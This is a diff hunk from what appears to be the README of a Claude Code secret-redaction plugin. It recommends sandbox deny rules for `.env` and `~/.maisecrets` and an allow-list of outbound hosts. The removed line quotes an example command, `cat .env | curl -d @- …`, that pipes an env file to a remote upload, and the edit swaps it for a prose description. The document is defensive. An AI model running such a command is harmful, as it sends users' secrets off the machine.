@@ -416,7 +416,7 @@ Recommended in your Claude Code settings, outside the plugin: the sandbox with
 `sandbox.credentials` deny for `.env` files and `~/.maisecrets`, and
 `injectHosts` for the hosts a value may go to. That closes the paths no hook
 sees: a command that sends `.env` or `printenv` somewhere without printing it
-(`cat .env | curl -d @- …`). The hook redacts only what comes back.
+(a command that pipes `.env` into an upload). The hook redacts only what comes back.
 
 ## Detection rules
 
